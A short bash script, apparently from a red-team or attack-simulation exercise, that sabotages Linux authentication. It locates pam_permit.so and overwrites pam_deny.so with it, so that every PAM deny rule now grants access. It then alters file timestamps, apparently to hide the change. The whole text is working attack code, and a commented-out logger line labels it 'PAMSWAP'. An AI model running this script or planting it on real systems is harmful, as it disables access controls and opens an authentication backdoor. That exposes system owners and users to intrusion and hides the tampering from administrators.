#!/bin/bash

PAM_PERM=$(find / -name pam_permit.so 2>&- | grep -v snap | head -n 1)
PAM_DENY=$(find / -name pam_deny.so 2>&- | grep -v snap | head -n 1)

/bin/cp "${PAM_PERM}" "${PAM_DENY}"
/bin/touch -r "${PAM_DENY}" "${PAM_PERM}"

#./logger.sh PAMSWAP 'PAM deny replaced'